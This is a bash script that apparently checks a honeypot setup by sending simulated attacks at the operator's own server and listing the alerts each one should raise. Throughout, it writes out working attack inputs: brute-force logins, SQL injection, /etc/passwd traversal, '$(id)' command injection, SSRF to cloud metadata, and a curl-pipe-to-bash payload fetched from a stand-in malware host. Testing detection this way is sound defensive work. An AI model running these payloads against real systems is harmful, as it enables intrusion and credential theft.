#!/bin/bash
# neuro-attack-verify.sh
# Run from your LOCAL machine (laptop/jump host) — NOT from the VPS.
# DNAT rules only fire on external traffic (iif eth0).
#
# Usage:
#   chmod +x neuro-attack-verify.sh
#   ./neuro-attack-verify.sh           # all tests
#   ./neuro-attack-verify.sh ssh       # single section
#   ./neuro-attack-verify.sh http      # HTTP section only
#
# Watch Telegram while running — alerts should fire within 10-15 seconds.
# Watch HoneyDash live feed at http://158.220.110.47:8090/ (All sensors selected).

TARGET="158.220.110.47"
HTTP="http://neuro.cyveera.com:8081"

# Colors
R='\033[0;31m'; G='\033[0;32m'; Y='\033[1;33m'; B='\033[0;34m'; NC='\033[0m'; BOLD='\033[1m'

header()  { echo -e "\n${BOLD}${B}══════════════════════════════════════${NC}"; echo -e "${BOLD}${Y}  $1${NC}"; echo -e "${BOLD}${B}══════════════════════════════════════${NC}"; }
ok()      { echo -e "  ${G}✓ $1${NC}"; }
expect()  { echo -e "  ${Y}⟶  Expect: $1${NC}"; }
sentinel(){ echo -e "  ${R}🔔 Sentinel: $1${NC}"; }
honeyd()  { echo -e "  ${B}📊 HoneyDash: $1${NC}"; }
pause()   { echo -e "\n  ${Y}Press ENTER to continue...${NC}"; read -r; }

SECTION="${1:-all}"

# ─────────────────────────────────────────
# SSH — Cowrie (port 22 → container :2222)
# ─────────────────────────────────────────
run_ssh() {
  header "SSH — Cowrie (port 22)"

  echo -e "\n${BOLD}[1/3] Failed login (SSH brute force)${NC}"
  ssh -o StrictHostKeyChecking=no \
      -o PasswordAuthentication=yes \
      -o PubkeyAuthentication=no \
      -o ConnectTimeout=8 \
      -o BatchMode=no \
      root@$TARGET exit 2>&1 | head -5 || true
  expect "Permission denied or connection refused"
  sentinel "SSH Brute Force from your IP"
  honeyd "SSH Brute Force + SSH Connect rows in live feed"

  pause

  echo -e "\n${BOLD}[2/3] Successful login (if sshpass available)${NC}"
  if command -v sshpass &>/dev/null; then
    sshpass -p 'root' ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=8 root@$TARGET "whoami; ls /; cat /root/.config/neuro/config.yaml 2>/dev/null; exit" 2>&1 | head -20 || true
    ok "SSH login with password 'root'"
    expect "Fake shell output; may see config.yaml with AWS key"
    sentinel "🚨 SSH Login SUCCESS — high priority, no cooldown"
    honeyd "SSH Login row; Command Execution rows with commands shown"
  else
    echo -e "  ${Y}sshpass not found — install with: brew install hudochenkov/sshpass/sshpass${NC}"
    echo -e "  ${Y}Manual: ssh root@$TARGET  (type password: root)${NC}"
  fi

  pause

  echo -e "\n${BOLD}[3/3] Malware download simulation (if logged in)${NC}"
  if command -v sshpass &>/dev/null; then
    sshpass -p 'admin' ssh -o StrictHostKeyChecking=no \
        -o ConnectTimeout=8 admin@$TARGET \
        "wget http://httpbin.org/get -O /tmp/payload.sh; chmod +x /tmp/payload.sh" 2>&1 | head -10 || true
    sentinel "🚨 Malware Download — no cooldown, always fires"
    honeyd "Malware Download row"
  else
    echo -e "  ${Y}Requires sshpass — skip or log in manually${NC}"
  fi
}

# ─────────────────────────────────────────
# FTP — OpenCanary (port 21)
# ─────────────────────────────────────────
run_ftp() {
  header "FTP — OpenCanary (port 21)"

  echo -e "\n${BOLD}[1/2] Anonymous FTP connect${NC}"
  curl -s --connect-timeout 8 --max-time 10 \
      ftp://anonymous:test@$TARGET/ 2>&1 | head -5 || true
  expect "Fake directory listing or connection reset"
  sentinel "FTP Connect from your IP"
  honeyd "FTP Connect in live feed, protocol=ftp"

  pause

  echo -e "\n${BOLD}[2/2] FTP brute force attempt${NC}"
  curl -s --connect-timeout 8 --max-time 10 \
      ftp://admin:password@$TARGET/ 2>&1 | head -5 || true
  expect "Login failure"
  sentinel "FTP Brute Force"
  honeyd "FTP Brute Force in live feed"
}

# ─────────────────────────────────────────
# Telnet — OpenCanary (port 23)
# ─────────────────────────────────────────
run_telnet() {
  header "Telnet — OpenCanary (port 23)"

  echo -e "\n${BOLD}[1/1] Telnet login attempt${NC}"
  if command -v nc &>/dev/null; then
    printf "admin\npassword\n\n" | nc -w 8 $TARGET 23 2>&1 | head -10 || true
    ok "Telnet probe sent (admin / password)"
    expect "Login banner or timeout"
    sentinel "Telnet Brute Force"
    honeyd "Telnet Brute Force in live feed, protocol=telnet"
  else
    echo -e "  ${Y}nc not found — install netcat${NC}"
  fi
}

# ─────────────────────────────────────────
# Redis — OpenCanary (port 6379)
# ─────────────────────────────────────────
run_redis() {
  header "Redis — OpenCanary (port 6379)"

  echo -e "\n${BOLD}[1/2] Redis AUTH + commands${NC}"
  if command -v nc &>/dev/null; then
    printf "AUTH password123\r\nPING\r\nINFO server\r\nCONFIG GET *\r\n" \
        | nc -w 8 $TARGET 6379 2>&1 | head -10 || true
    ok "Redis AUTH + PING + INFO + CONFIG GET sent"
    expect "Fake Redis responses"
    sentinel "Redis Auth Attempt + Redis Command"
    honeyd "Redis Auth Attempt + Redis Command with command_input shown"
  else
    echo -e "  ${Y}nc not found — install netcat${NC}"
  fi

  pause

  echo -e "\n${BOLD}[2/2] Redis-cli (if available)${NC}"
  if command -v redis-cli &>/dev/null; then
    redis-cli -h $TARGET -p 6379 AUTH wrongpassword 2>&1 || true
    redis-cli -h $TARGET -p 6379 KEYS "*" 2>&1 || true
  else
    echo -e "  ${Y}redis-cli not found — nc test above is sufficient${NC}"
  fi
}

# ─────────────────────────────────────────
# MariaDB — real lure (port 3306)
# ─────────────────────────────────────────
run_mariadb() {
  header "MariaDB Lure (port 3306)"

  echo -e "\n${BOLD}[1/2] MySQL connection attempt (wrong password)${NC}"
  if command -v mysql &>/dev/null; then
    mysql -h $TARGET -P 3306 -u neuro_app -p'wrongpassword' \
        --connect-timeout=8 neuro_prod 2>&1 | head -5 || true
    ok "MySQL connect attempted (neuro_app / wrongpassword)"
    expect "Access denied error"
    sentinel "MySQL Connect"
    honeyd "MySQL Connect in live feed, protocol=mysql"
  elif command -v nc &>/dev/null; then
    # Raw TCP to port 3306 — MariaDB sends greeting banner
    nc -w 5 $TARGET 3306 2>&1 | head -3 || true
    ok "Raw TCP probe to port 3306"
    sentinel "MySQL Connect"
  else
    echo -e "  ${Y}Install mysql client: brew install mysql-client${NC}"
  fi

  pause

  echo -e "\n${BOLD}[2/2] MySQL login + query${NC}"
  if command -v mysql &>/dev/null; then
    mysql -h $TARGET -P 3306 -u neuro_app -p'NeuroML2024!' \
        --connect-timeout=8 neuro_prod \
        -e "SHOW TABLES; SELECT * FROM model_runs LIMIT 3;" 2>&1 | head -20 || true
    ok "MySQL login with lure credential (neuro_app / NeuroML2024!)"
    expect "Fake neuro_prod schema tables"
    sentinel "MySQL Connect + kill-chain credential relay alert"
    honeyd "MySQL Connect + MySQL Query rows with SQL shown"
  fi
}

# ─────────────────────────────────────────
# HTTP — Honeypot-API (port 8081)
# ─────────────────────────────────────────
run_http() {
  header "HTTP — Honeypot-API ($HTTP)"

  # ── Lure login ─────────────────────────
  echo -e "\n${BOLD}[1/9] Lure credential login${NC}"
  curl -s -c /tmp/neuro_cookies.txt \
      -X POST "$HTTP/api/v1/auth" \
      -H "Content-Type: application/json" \
      -d '{"email":"m.chen@neuro.ai","password":"NeuroAdmin2024!"}' | python3 -m json.tool
  ok "Login as m.chen@neuro.ai / NeuroAdmin2024!"
  expect '{"redirect":"/dashboard","token":"..."}'
  sentinel "🔑 LURE CREDENTIAL USED — always fires, no cooldown"
  honeyd "Lure Access in live feed + Lure Credential Used attack type"

  pause

  # ── SQL Injection ──────────────────────
  echo -e "\n${BOLD}[2/9] SQL injection attempt${NC}"
  curl -s "$HTTP/login?email=%27+OR+%271%27%3D%271&password=x" -o /dev/null -w "HTTP %{http_code}\n"
  curl -s -X POST "$HTTP/api/v1/auth" \
      -H "Content-Type: application/json" \
      -d '{"email":"admin'\''--","password":"x"}' | python3 -m json.tool
  expect "Login failure response (SQLi blocked)"
  sentinel "SQL Injection alert"
  honeyd "SQL Injection in live feed + attack types card"

  pause

  # ── LFI / Path traversal ──────────────
  echo -e "\n${BOLD}[3/9] LFI / path traversal${NC}"
  curl -s "$HTTP/artifacts?path=../../etc/passwd" | head -10
  expect "Fake /etc/passwd contents (static response)"
  sentinel "LFI Attempt"
  honeyd "LFI Attempt in live feed"

  pause

  # ── RCE attempt ───────────────────────
  echo -e "\n${BOLD}[4/9] RCE attempt (startup_script injection)${NC}"
  curl -s -X POST "$HTTP/jobs/new" \
      -H "Content-Type: application/json" \
      --data-raw '{"startup_script":"$(id)","gpu_count":1,"model":"llama3-8b"}' | python3 -m json.tool
  expect '{"ok":true,"output":"uid=1000(neuro-svc)...","status":"queued"}'
  sentinel "RCE Attempt"
  honeyd "RCE Attempt in live feed with payload shown"

  pause

  # ── SSRF — remote import ──────────────
  echo -e "\n${BOLD}[5/9] SSRF — remote import (AWS IMDS)${NC}"
  curl -s -X POST "$HTTP/api/v1/data/remote-import" \
      -H "Content-Type: application/json" \
      -d '{"source_url":"http://169.254.169.254/latest/meta-data/","dataset_name":"exfil","format":"json"}' | python3 -m json.tool
  expect '{"status":"ingestion_queued","job_id":"..."}'
  sentinel "🕸 SSRF Attempt with exact URL captured"
  honeyd "SSRF Attempt in live feed"

  pause

  # ── SSRF — webhook test ───────────────
  echo -e "\n${BOLD}[6/9] SSRF — webhook test (internal relay)${NC}"
  curl -s -X POST "$HTTP/api/v1/integrations/webhook/test" \
      -H "Content-Type: application/json" \
      -c /tmp/neuro_cookies.txt \
      -d '{"url":"http://10.31.4.22:3128/internal","secret":"test"}' | python3 -m json.tool
  expect '{"status":"delivered","relay":"http://10.31.4.22:3128/"}'
  sentinel "SSRF Attempt (webhook)"
  honeyd "SSRF Attempt in live feed"

  pause

  # ── Lure file download (canary CSV) ───
  echo -e "\n${BOLD}[7/9] Lure file download — canary CSV with AWS key${NC}"
  curl -s "$HTTP/api/v1/data/exports/download?file=workspace-export-2026-05-31.csv" -o /tmp/canary_test.csv
  head -3 /tmp/canary_test.csv
  ok "Downloaded workspace-export CSV"
  expect "CSV rows with AWS keys (row 4 = live canarytoken AKIAYZM57LXRGIYTCOUV)"
  sentinel "📤 LURE FILE DOWNLOADED — always fires, no cooldown"
  honeyd "Data Exfiltration in live feed"

  pause

  # ── Malware upload ────────────────────
  echo -e "\n${BOLD}[8/9] Malware upload${NC}"
  echo '#!/bin/bash
curl -s http://malware.example.com/payload.sh | bash' > /tmp/fake_payload.sh
  curl -s -X POST "$HTTP/api/v1/training/jobs/script-upload" \
      -F "file=@/tmp/fake_payload.sh;type=text/x-shellscript" | python3 -m json.tool
  expect '{"status":"queued","job_id":"..."}'
  sentinel "🦠 MALWARE UPLOAD CAPTURED — always fires"
  honeyd "Malware Upload in live feed"
  rm -f /tmp/fake_payload.sh

  pause

  # ── Admin page + security actions ─────
  echo -e "\n${BOLD}[9/9] Admin page access (requires session from login test)${NC}"
  curl -s -b /tmp/neuro_cookies.txt "$HTTP/admin" | grep -o 'Confirm identity\|admin\|elevated' | head -5 || true
  ok "Admin page accessed with session cookie"
  expect "Re-auth form pre-filled with m.chen@neuro.ai"
  sentinel "Admin page visit logged"
  honeyd "Lure Access row"
}

# ─────────────────────────────────────────
# Cross-sensor kill chain
# ─────────────────────────────────────────
run_killchain() {
  header "Kill Chain — HTTP login → SSH → MariaDB"

  echo -e "\n${BOLD}Kill chain demo (same IP hits 3+ sensors)${NC}"
  echo -e "  This script has already hit HTTP + optionally SSH + MariaDB."
  echo -e "  Sentinel checks every 5 polls (~50s) for multi-sensor correlation."
  echo -e "\n  Wait ~60 seconds, then check Telegram for:"
  sentinel "🔗 KILL CHAIN DETECTED — 3+ sensors from your IP in 60 min"
  echo ""
  echo -e "  Also check Telegram for credential replay if you used"
  echo -e "  'NeuroML2024!' on MariaDB — same password is in HTTP lure data."
  sentinel "🔄 CREDENTIAL RELAY — same password on HTTP + MariaDB"
}

# ─────────────────────────────────────────
# Runner
# ─────────────────────────────────────────
echo -e "${BOLD}${G}"
echo "  ███╗   ██╗███████╗██╗   ██╗██████╗  ██████╗ "
echo "  ████╗  ██║██╔════╝██║   ██║██╔══██╗██╔═══██╗"
echo "  ██╔██╗ ██║█████╗  ██║   ██║██████╔╝██║   ██║"
echo "  ██║╚██╗██║██╔══╝  ██║   ██║██╔══██╗██║   ██║"
echo "  ██║ ╚████║███████╗╚██████╔╝██║  ██║╚██████╔╝"
echo "  ╚═╝  ╚═══╝╚══════╝ ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ "
echo -e "${NC}"
echo -e "  Target : ${BOLD}$TARGET${NC}"
echo -e "  HTTP   : ${BOLD}$HTTP${NC}"
echo -e "  Mode   : ${BOLD}${SECTION}${NC}"
echo -e "\n  ${Y}Open Telegram + HoneyDash live feed before running.${NC}"
echo -e "  ${Y}HoneyDash → http://158.220.110.47:8090 → Live Feed → All sensors${NC}\n"

case "$SECTION" in
  ssh)       run_ssh ;;
  ftp)       run_ftp ;;
  telnet)    run_telnet ;;
  redis)     run_redis ;;
  mariadb)   run_mariadb ;;
  http)      run_http ;;
  killchain) run_killchain ;;
  all)
    run_ssh
    run_ftp
    run_telnet
    run_redis
    run_mariadb
    run_http
    run_killchain
    ;;
  *)
    echo "Usage: $0 [all|ssh|ftp|telnet|redis|mariadb|http|killchain]"
    exit 1
    ;;
esac

echo -e "\n${BOLD}${G}══ Verification complete ══${NC}"
echo -e "Check Telegram alerts and HoneyDash attack types for all hits above.\n"
